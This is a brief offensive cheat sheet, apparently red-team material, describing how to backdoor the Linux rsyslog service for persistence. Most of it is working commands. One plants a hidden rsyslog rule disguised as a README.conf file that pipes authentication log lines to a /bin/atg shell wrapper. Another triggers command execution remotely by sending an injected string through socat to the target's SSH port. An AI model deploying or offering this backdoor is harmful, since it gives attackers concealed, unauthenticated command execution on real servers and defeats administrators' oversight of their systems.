# RSYSLOG Backdoor

rsyslog is a Linux service for gathering and managing system-wide logs. since the log managing services and programs are always running on production servers and almost all systems, backdooring rsyslog and similar services are a good way of gaining persistence.

LISTEN:

```
man -a rsyslogd syslog|perl -pe'print "auth.* ^/bin/atg "if$.==177;print"#"' > /etc/rsyslog.d/README.conf
echo -e '#!/bin/sh\nsh -c "$1"'>/bin/atg
chmod 755 /bin/atg
/etc/init.d/rsyslog restart
```

EXECUTE:

```
echo "';whoami>/tmp/rsyslogd.owned;'"| socat STDIO TCP4:<target ip>:22
```
